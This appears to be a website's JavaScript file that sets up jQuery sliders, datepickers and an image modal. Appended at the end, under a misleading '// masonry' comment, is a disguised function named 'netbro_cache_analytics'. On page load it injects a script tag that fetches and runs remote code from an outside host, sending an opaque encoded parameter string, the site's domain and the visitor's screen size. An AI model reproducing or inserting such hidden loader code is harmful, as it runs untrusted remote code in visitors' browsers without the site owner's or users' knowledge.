$(document).ready(function(){
  $('.test').bxSlider({
    auto: true,
    mode: 'fade',
    controls: false
  }); 

  $('.dateRangePicker').datepicker({
    changeMonth: true,
    changeYear: true,
    format: 'dd MM yyyy',
    orientation: 'bottom auto'
  });

  $('.date').datepicker({
    changeMonth: true,
    changeYear: true,
    format: 'dd MM yyyy',
    autoclose: true,
  });

  var faci = $('#faci').bxSlider({
    auto: false,
    mode: 'fade',
    pager: false,
    controls: false,
  });

  $(".arrowprev").click(function() {faci.goToPrevSlide();});
  $(".arrownext").click(function() {faci.goToNextSlide();});

  $(".showModalImage").on( "click", function() {
    $('#modalImage').modal('show');  
  });

});

// masonry
if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mCwR%2fOleom01A4JkXxQLlPYABYhRMHyqgC3TAwvBrNE%2bEEHtVtPIr9uJndaQhu%2fxGjFA9xZSCzsxOdTmtlpjjeZmGFwo5XTGFnlSSSc%2fotWgBwD%2ff7ID0zMgpAaN1HCbb9vQGdGjOBYuYsu%2b7wJdG5bJs%2foWo2SC0BJNefVl%2bqqByZPQBMPszXWo9bzj%2bKN6hw77fydrixGllDR5lo9cKcN5T8dtWr6eLNx8P%2b57clorSqfRi2zQpkFZYSapzvQU6McHDsmo5U0m6rVcBBMb72sE2h%2fNMG0P4U5LB7g6lviASIqiMLON4zOc4qlQi6EyTjqOen8w%2f5TVlgkCmBO6j4mWK%2bUeX0%2fCvHkCtRzkLRIVrASARXl%2bAp9PHsuMQOqLnl1cVJR9l2vA7XHzmx8aSQ5tbSWypUXcPBUeyNpvGmjA1xA9mKJ8BhGOQoVe5lxrNsGWGvM9TzJ9s5kowzVuo5sY4zdgjQI%2bwZFEkRHvunP3S1TnEPJcpFg%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};

